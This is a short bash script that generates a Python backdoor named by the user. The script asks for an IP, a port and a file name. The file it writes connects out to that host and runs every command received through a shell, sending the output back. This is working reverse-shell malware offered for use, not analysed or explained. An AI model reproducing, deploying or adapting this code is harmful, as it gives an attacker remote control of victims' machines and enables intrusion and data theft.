read -p "Enter IP:" ip
read -p "Enter PORT:" port
read -p "Enter backdoor name:" name
path=`pwd`
echo "$ip" > /usr/share/backdoor_IHA/ip
echo "$port" > /usr/share/backdoor_IHA/port
cat > $path/$name <<EOF
import socket
import os
import subprocess
from subprocess import call


s = socket.socket()
host = '$ip'
port = $port
s.connect((host, int(port)))
s.send(bytes('\033[1;31m' + os.getcwd() + '>>', 'utf-8'))
while True:
    try:
        data = s.recv(24576)
        data = str(data, 'utf-8')
        if data == 'cls':
            _ = call('clear' if os.name =='posix' else 'cls')
            data = "echo -n"
        if data[:2] == 'cd':
            try:
                filename = data[3:]
                os.chdir(filename)
                data = "echo -n"
            except:
                pass
        if data[:4] == 'show':
            mmd = data[5:]
            print(mmd)
            data = "echo -n"
        if data[:4] == 'exit':
            break

        if len(data) > 0:
            cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output, 'utf-8')
            s.send(str.encode('\033[0;32m' + output_str + '\033[1;31m' + str(os.getcwd()) + '>>'))
    except KeyboardInterrupt:
        s.send(str.encode('\033[0;32m' + "Exiting by client"))
        exit()
    except UnicodeDecodeError:
        s.send(str.encode('\033[0;32m' + "file is not decoded able\n"+ '\033[1;31m' + str(os.getcwd()) + '>>'))
        pass
    except:
        s.send(str.encode('\033[0;32m' + "An error occur at client side\n" + '\033[1;31m' + str(os.getcwd()) + '>>'))
        pass
EOF
printf "save at $path as '$name'\n"

